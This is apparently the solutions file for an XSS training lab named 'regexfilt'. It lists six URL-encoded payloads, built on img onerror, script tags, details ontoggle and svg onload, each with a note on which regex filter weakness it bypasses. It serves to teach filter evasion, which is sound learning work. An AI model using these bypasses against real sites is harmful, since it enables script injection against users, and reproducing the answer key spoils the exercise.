# regexfilt — solutions

Regex-based filters that miss alternative tags, attribute styles, or scheme variations.

### regexfilt-level1

`/regexfilt/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: regex eats `<script>...</script>` greedy block; img bypasses

### regexfilt-level2

`/regexfilt/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only `on*=` event handlers stripped; raw script tag passes

### regexfilt-level3

`/regexfilt/level3/?query=%3Cdetails%20open%20ontoggle=alert(1)%3E`

- payload: `<details open ontoggle=alert(1)>`
- context: only script/img/svg/iframe stripped; details survives

### regexfilt-level4

`/regexfilt/level4/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: `javascript:` stripped in href; break out of attribute

### regexfilt-level5

`/regexfilt/level5/?query=%3Cdetails%20open%20ontoggle=alert(1)%3E`

- payload: `<details open ontoggle=alert(1)>`
- context: known tag blacklist; details not listed

### regexfilt-level6

`/regexfilt/level6/?query=%3Cimg%20src=x%20onerror=confirm(1)%3E`

- payload: `<img src=x onerror=confirm(1)>`
- context: `alert` rewritten to `_alert_`; use `confirm`
